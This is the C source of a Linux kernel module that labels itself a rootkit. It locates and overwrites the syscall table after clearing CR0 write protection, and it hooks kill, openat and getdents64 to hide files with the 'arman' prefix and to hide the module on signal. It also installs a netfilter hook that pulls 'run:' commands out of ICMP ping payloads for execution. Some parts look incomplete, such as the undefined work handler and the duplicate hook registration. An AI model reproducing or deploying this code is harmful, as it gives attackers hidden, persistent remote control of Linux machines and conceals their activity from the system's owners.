#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ftrace.h>
#include <linux/list.h>

#ifdef MODULE
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module *)0)
#endif

#define HIDE_PREFIX     "arman"
#define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)

#define MAX_CMD_LEN 1976

// Syscall table address pointer
unsigned long *__sys_call_table_addr;
static struct list_head *prev_module;

char cmd_string[MAX_CMD_LEN];
struct work_struct my_work;

static struct nf_hook_ops nfho;

enum signals {
    HIDEMODULE = 64,
    SHOWMODULE = 63,
    HIDEFILES = 62,
    SHOWFILES = 61,
};

// Using kprobes method for getting syscall table address for new versions of kernel
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
		.symbol_name = name
	};

    unsigned long ret_value;

    if (register_kprobe(&kp) < 0) return 0;

    ret_value = (unsigned long) kp.addr;
    unregister_kprobe(&kp);

    return ret_value;
}

#else

static unsigned long lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}

#endif

#ifdef KPROBE_

// Defining kprobe for syscall_table (should be replaced with function above)
typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);

static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif

// Using cr0 register for changing permission of syscall table to rw, for x86 architecture only
#ifdef CONFIG_X86

#include <asm/paravirt.h>
#define PTREGS_MODIF

// For new versions of kernel ptregs_t type serves as a syscall wrapepr
typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);

static syscall_wrapper orig_kill;
static syscall_wrapper orig_sys_openat;
static syscall_wrapper orig_sys_getdents64;


// write_cr0 is useless in a 5x linux kernell
// cr0 allows supervisor-level procedures to write into read-only pages
static inline void write_forced_cr0(unsigned long value)
{
    unsigned long __force_order;

    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}

static void unprotect_memory(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
    pr_info("Unprotected memory\n");
}

static void protect_memory(void)
{
    write_forced_cr0(read_cr0() | 0x10000);
    pr_info("Protected memory\n");
}

#endif

// Modified syscalls
#ifdef PTREGS_MODIF

static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
{
    int sig = regs->si;

    void hide_module(void);
    void show_module(void);

    if (sig == HIDEMODULE) {
        hide_module();
        return 0;
    } else if (sig == SHOWMODULE) {
        show_module();
        return 0;
    } else if (sig == HIDEFILES) {
        return 0;
    } else if (sig == SHOWFILES) {
        return 0;
    }

    return orig_kill(regs);
}

static asmlinkage long fh_sys_openat(struct pt_regs *regs)
{
    const char __user* pathname = (const char __user *)regs->si;

	long err;
	char *kernel_filename = NULL;

    int pathlen = strnlen_user(pathname, 256);
    kernel_filename = kzalloc(pathlen, GFP_KERNEL);

    if (kernel_filename == NULL)
        return -ENOENT;

    err = copy_from_user(kernel_filename, pathname, pathlen);
    if (err)
        return -EACCES;

    if (strstr(kernel_filename, HIDE_PREFIX) != NULL) {
        kfree(kernel_filename);
        return -ENOENT;
    }

	kfree(kernel_filename);

	return orig_sys_openat(regs);
}

static asmlinkage long h_sys_getdents64(struct pt_regs *regs)
{
    unsigned int fd = regs->di;
    unsigned int count = regs->dx;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;

    int buff;
    struct linux_dirent64 __user *ent;
    char *dbuf;

    long ret = orig_sys_getdents64(regs);

    if (ret <= 0) return ret;

    dbuf = kmalloc(ret, GFP_KERNEL);
	memset(dbuf, 0, ret);
	copy_from_user(dbuf, dirent, ret);

    for (buff = 0; buff < ret;) {
		ent = (struct linux_dirent64*)(dbuf + buff);

		if (strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) {
			size_t reclen = ent->d_reclen;

			memcpy(dbuf + buff, dbuf + buff + reclen, ret - (buff + reclen));
			ret -= reclen;
		} else {
			buff += ent->d_reclen;
		}
	}

	copy_to_user(dirent, dbuf, ret);
	kfree(dbuf);
	return ret;
}

#endif

void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_module(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

// Working with syscalls

static void store_kill(void)
{
    orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
}


static void hook_kill(void)
{
    __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
}


static void restore_kill(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
}

static void store_openat(void)
{
    orig_sys_openat = (syscall_wrapper)__sys_call_table_addr[__NR_openat];
}


static void hook_openat(void)
{
    __sys_call_table_addr[__NR_openat] = (unsigned long)&fh_sys_openat;
}


static void restore_openat(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_openat] = (unsigned long)orig_sys_openat;
}


static void store_getdents64(void)
{
    orig_sys_getdents64 = (syscall_wrapper)__sys_call_table_addr[__NR_getdents64];
}


static void hook_getdents64(void)
{
    __sys_call_table_addr[__NR_getdents64] = (unsigned long)&h_sys_getdents64;
}


static void restore_getdents64(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_getdents64] = (unsigned long)orig_sys_getdents64;
}

static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct icmphdr *icmph;

    unsigned char *user_data;
    unsigned char *tail;
    int j = 0;

    pr_info("icmp_cmd_executor executing\n");

    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);

    if (iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    j = 0;
    while (user_data != tail){
        char c = *user_data;

        cmd_string[j] = c;
        j++;

        if (c == '\0' || j == MAX_CMD_LEN){
            break;
        }

        user_data++;
    }

    pr_info("cmd_string: %s\n", cmd_string);

    if (strncmp(cmd_string, "run:", 4) == 0) {
        for (j = 0; cmd_string[j + 4] != '\0'; j++) {
            cmd_string[j] = cmd_string[j + 4];
        }
        cmd_string[j] = '\0';

        schedule_work(&my_work);
    }

    return NF_ACCEPT;
}


// Function that launches when module is inserted
static int __init mod_init(void)
{
    int ret; // to store return code of register_kprobe
    kallsyms_lookup_name_t kallsyms_lookup_name; // to store the address of kallsyms_lookup_name function

    pr_info("rootkit: started\n");
    nfho.hook = icmp_cmd_executor;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);

    nfho.hook = icmp_cmd_executor;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);

#ifdef KPROBE_

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif

    __sys_call_table_addr = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    store_kill();
    store_openat();
    store_getdents64();

    unprotect_memory();

    hook_kill();
    hook_getdents64();
    hook_openat();

    protect_memory();

    return 0;
}


// Function that launches when module is released
static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");

    unprotect_memory();

    restore_kill();
    restore_openat();
    restore_getdents64();

    protect_memory();

    nf_unregister_net_hook(&init_net, &nfho);
}

MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
